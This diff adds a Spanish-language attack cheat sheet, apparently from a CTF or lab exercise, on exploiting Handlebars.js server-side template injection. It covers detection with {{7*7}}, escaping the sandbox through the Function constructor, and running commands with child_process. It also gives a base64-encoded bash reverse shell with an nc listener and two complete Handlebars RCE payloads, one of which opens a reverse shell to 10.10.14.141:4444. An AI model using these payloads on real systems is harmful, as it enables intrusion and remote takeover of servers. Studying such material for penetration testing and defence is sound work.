@@ -1,0 +1,121 @@
+ Server Side Template Injection
+
+
+ SSTI -> RCE -> root
+ 
+
+
+
+QUE ES ESTA VULNERABILIDAD?
+ 
+
+SSTI — Server-Side Template Injection
+
+El servidor usa Handlebars.js para renderizar plantillas.
+Si el input del usuario se procesa sin sanitizar, puedes
+inyectar logica de plantilla directamente.
+ 
+Por ejemplo con el comando 
+
+{{7*7}}
+
+si devuelve 49 (SSTI confirmado)
+ 
+o a su vez cualquier otro error que mencione un node.js, etc con los Handlebars
+
+------------------------------------------------------------
+ 
+Sandbox Escape via Function Constructor
+Handlebars tiene sandbox, pero todo en JS tiene constructor.
+Se puede escalar asi:
+ 
+  "string".sub.constructor === Function
+  -> con Function() puedes ejecutar JS arbitrario
+ 
+------------------------------------------------------------
+ 
+RCE con child_process
+Node.js tiene el modulo nativo child_process que ejecuta
+comandos del sistema. Con acceso libre a JS, lo cargamos
+con require().
+ 
+  require('child_process').execSync('whoami').toString()
+ 
+IMPORTANTE:
+- exec     = asincrono, NO muestra output
+- execSync = sincrono, SI devuelve el resultado
+ 
+------------------------------------------------------------
+ 
+
+con la joya de la corona, para explotar esto de manera mas lenta se usa el encoder/decoder de burpsuite, encodeando en formato URL, sin embargo nos podemos aprovechar dependiendo el OS, para hacer una reverse shell
+(base64 trick)
+Los caracteres >& se rompen en HTTP.
+Solucion: encodear el comando en base64.
+ 
+  # 1. Generar payload en tu terminal
+  echo 'bash -i >& /dev/tcp/TU_IP/4444 0>&1' | base64
+ 
+  # 2. Ponerte en escucha
+  nc -lvnp 4444
+ 
+  # 3. Ejecutar en el exploit
+  exec('echo BASE64== | base64 -d | bash')
+ 
+  OJO: usar exec (no execSync) para reverse shell
+       execSync bloquea y no conecta
+ 
+------------------------------------------------------------
+PAYLOAD COMPLETO para usarlo sin una reverse shell
+------------------------------------------------------------
+ 
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').execSync('COMANDO').toString();"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+ 
+  Para reverse shell cambiar execSync por exec y el comando por:
+  echo BASE64== | base64 -d | bash
+ 
+------------------------------------------------------------
+
+COMANDO PARA USARLO CON REVERSE SHELL (Se debe encodear)
+
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return process.mainModule.require('child_process').exec('bash -i >& /dev/tcp/10.10.14.141/4444 0>&1');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+
+
